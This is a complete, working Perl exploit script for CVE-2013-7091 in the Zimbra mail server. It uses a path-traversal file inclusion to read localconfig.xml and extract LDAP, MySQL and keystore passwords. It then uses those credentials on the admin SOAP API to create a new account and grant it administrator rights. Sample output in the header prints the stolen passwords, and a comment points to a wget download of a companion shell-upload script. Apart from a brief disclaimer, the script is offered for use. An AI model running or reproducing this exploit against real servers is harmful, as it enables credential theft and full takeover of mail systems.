#!/usr/bin/perl
#
# Title: Zimbra file inclusion/Admin account creation exploit
# CVE: 2013-7091
# Author: Simo Ben youssef
# Contact: Simo_at_Morxploit_com
# Coded: 20 February 2014
# Published: 20 February 2014
# MorXploit Research
# http://www.MorXploit.com
#
# Perl code to exploit CVE: 2013-7091
# Extracts zimbra passwords and create an admin account
# To upload a shell:
# wget http://www.morxploit.com/morxploits/morxzimbrashell.pl
#
# Requires LWP::UserAgent
# apt-get install libwww-perl
# yum install libwww-perl
# perl -MCPAN -e 'install Bundle::LWP'
#
# Tested on Linux Ubuntu
#
# Author disclaimer:
# The information contained in this entire document is for educational, demonstration and testing purposes only.
# Author cannot be held responsible for any malicious use. Use at your own risk.
#
# Exploit usage:
# root@MorXploit:/home/simo/morx/zimbra# perl MorXZimbra.pl localhost 7071 newadmin newpass
# -------------------------------------------------------
# -- Zimbra file inclusion/Admin account creation exploit
# -- Code by: Simo Ben youssef <simo_at_MorXploit_dot_com>
# -- http://www.MorXploit.com
# -------------------------------------------------------
#
# [+] Target set to localhost:7071
#
# [*] Extracting passwords:
# [*] Trying to get ldap_postfix_password
# [+] Got ldap_postfix_password: z9FSlcSAl
# [*] Trying to get ldap_amavis_password
# [+] Got ldap_amavis_password: z9FSlcSAl
# [*] Trying to get ldap_replication_password
# [+] Got ldap_replication_password: z9FSlcSAl
# [*] Trying to get ldap_root_password
# [+] Got ldap_root_password: z9FSlcSAl
# [*] Trying to get ldap_nginx_password
# [+] Got ldap_nginx_password: z9FSlcSAl
# [*] Trying to get mailboxd_keystore_password
# [+] Got mailboxd_keystore_password: DaSA3aqQs
# [*] Trying to get zimbra_mysql_password
# [+] Got zimbra_mysql_password: iRZwhVag0Bv2Q1kLvCHfdGbD
# [*] Trying to get mysql_root_password
# [+] Got mysql_root_password: AA_VfnfsBasVnLMdewVzLpOf9iN
# [*] Trying to get mailboxd_truststore_password
# [+] Got mailboxd_truststore_password: changeit

# [*] Extracting zimbra ldap password/username:
# [*] Trying to get zimbra_user
# [+] Got zimbra_user: zimbra
# [*] Trying to get zimbra_ldap_password
# [+] Got zimbra_ldap_password: z9FSlcSAl
#
# [*] Trying to inject a new admin account via https://localhost:7071/service/admin/soap
# [+] Got auth token: 0_fb177eb0erc7a2f8676c46f85e861d7ad292b33f_69643d34098768239872384598392d3133363​02d313164392d383636312d3030306139356439386566323b6578703d31333j87623409187263784​98237654098b61646d696e3d313a313b747970653d363a7a696d6272613b
# [+] Got Zimbra domain: localhost
# [+] Got new account id: 7a43329b-9802-3cb3-dew3-3425675fd33f
# [+] Account successfully injected!
# [+] Account login: newadmin@localhost
# [+] Password: newpass
# [+] Login URL: https://localhost:7071/zimbraAdmin

use strict;
use LWP::UserAgent;

sub banner {
system('clear');
print "-------------------------------------------------------\n";
print "-- Zimbra file inclusion/Admin account creation exploit\n";
print "-- Code by: Simo Ben youssef <simo_at_MorXploit_dot_com>\n";
print "-- http://www.MorXploit.com\n";
print "-------------------------------------------------------\n\n";
}

if (!defined ($ARGV[0] && $ARGV[1] && $ARGV[2] && $ARGV[3])) {
banner();
print "Usage: perl $0 host port user pass\n";
print "Exp: perl $0 localhost 7071 newadmin newpass123\n";
exit;
}
my $host = $ARGV[0];
my $port = $ARGV[1];
my $user = $ARGV[2];
my $pass = $ARGV[3];
my $soappath = "service/admin/soap";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $can_accept = HTTP::Message::decodable;
my $response = $ua->get("https://$host:$port/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214​175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00",
    'Accept-Encoding' => $can_accept,
);

sub pwn {
print "[*] Trying to get $_[0]\n";
if ($response->decoded_content =~ /$_[0](.*?)<\/value>/s){
$1 =~ /a\["<value>(.*)/s;
print "[+] Got $_[0]: $1\n";
return $1;
}
else
{
print "[-] Failed to get $_[0]! Probably not vulnerable.\n";
exit;
}
}
system('clear');
banner();
print "[+] Target set to $host:$port\n";
print "\n[*] Extracting passwords:\n";
pwn("ldap_postfix_password");
pwn("ldap_amavis_password");
pwn("ldap_replication_password");
pwn("ldap_root_password");
pwn("ldap_nginx_password");
pwn("mailboxd_keystore_password");
pwn("zimbra_mysql_password");
pwn("mysql_root_password");
pwn("mailboxd_truststore_password");

print "\n[*] Extracting zimbra ldap password/username:\n";
my $ldap_user = pwn("zimbra_user");
my $ldap_pass = pwn("zimbra_ldap_password");


print "\n[*] Trying to inject a new admin account via https://$host:$port/$soappath\n";
my $message = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:ns1=\"urn:zimbraAdmin\" xmlns:ns2=\"urn:zimbraAdmin\"><env:Header><ns2:context/></env:Header><env:Body><ns1:AuthRequest><account by=\"name\">$ldap_user</account><password>$ldap_pass</password></ns1:AuthRequest></env:Body></env:Envelope>";
my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $request = HTTP::Request->new(POST => "https://$host:$port/$soappath");
$request->header(SOAPAction => 'urn:zimbraAdmin#AuthRequest');
$request->content($message);
$request->content_type('application/soap+xml; charset=utf-8');
my $response = $userAgent->request($request);
my $authtoken;
if ($response->content =~ /<authToken>(.*?)<\/authToken>/s){
$authtoken = $1;
print "[+] Got auth token: $authtoken\n";
}
else
{
print "[-] Failed to get auth token\n";
exit;
}
my $domain = "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><context xmlns=\"urn:zimbra\"><authToken>$authtoken</authToken></context></soap:Header><soap:Body><GetAllDomainsRequest xmlns=\"urn:zimbraAdmin\"></GetAllDomainsRequest></soap:Body></soap:Envelope>";
my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $request = HTTP::Request->new(POST => "https://$host:$port/$soappath");
$request->header(SOAPAction => 'urn:zimbraAdmin');
$request->content($domain);
$request->content_type('application/soap+xml; charset=utf-8');
my $response = $userAgent->request($request);

my $zimbradomain;
if ($response->content =~ /<a n=\"zimbraDomainName\">(.*?)<\/a>/s) {
$zimbradomain = $1;
print "[+] Got Zimbra domain: $zimbradomain\n";
}
else
{
print "[-] Failed to get domain\n";
exit;
}

my $newaccount = "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><context xmlns=\"urn:zimbra\"><authToken>$authtoken</authToken></context></soap:Header><soap:Body><CreateAccountRequest xmlns=\"urn:zimbraAdmin\"><name>$user\@$zimbradomain</name><password>$pass</password></CreateAccountRequest></soap:Body></soap:Envelope>";

my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $request = HTTP::Request->new(POST => "https://$host:$port/$soappath");
$request->header(SOAPAction => 'urn:zimbraAdmin');
$request->content($newaccount);
$request->content_type('application/soap+xml; charset=utf-8');
my $response = $userAgent->request($request);

my $accountid;
if ($response->content =~ /account id=\"(.*?)\"/s) {
$accountid = $1;
print "[+] Got new account id: $accountid\n";
}
else
{
print "[-] Failed to get account id! Account probably exists?\n";
exit;
}

my $makeadmin = "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><context xmlns=\"urn:zimbra\"><authToken>$authtoken</authToken></context></soap:Header><soap:Body><ModifyAccountRequest xmlns=\"urn:zimbraAdmin\"><id>$accountid</id><a n=\"zimbraIsAdminAccount\">TRUE</a></ModifyAccountRequest></soap:Body></soap:Envelope>";

my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $request = HTTP::Request->new(POST => "https://$host:$port/$soappath");
$request->header(SOAPAction => 'urn:zimbraAdmin');
$request->content($makeadmin);
$request->content_type('application/soap+xml; charset=utf-8');
my $response = $userAgent->request($request);

my $pwned;
if ($response->content =~ /name=\"(.*?)\">/s) {
$pwned = $1;
}
if ($pwned eq "$user\@$zimbradomain") {
print "[+] Account successfully injected!\n";
print "[+] Account login: $pwned\n";
print "[+] Password: $pass\n";
print "[+] Login URL: https://$host:$port/zimbraAdmin\n";
}

else {
print "[-] Something went wrong\n";
}
exit;
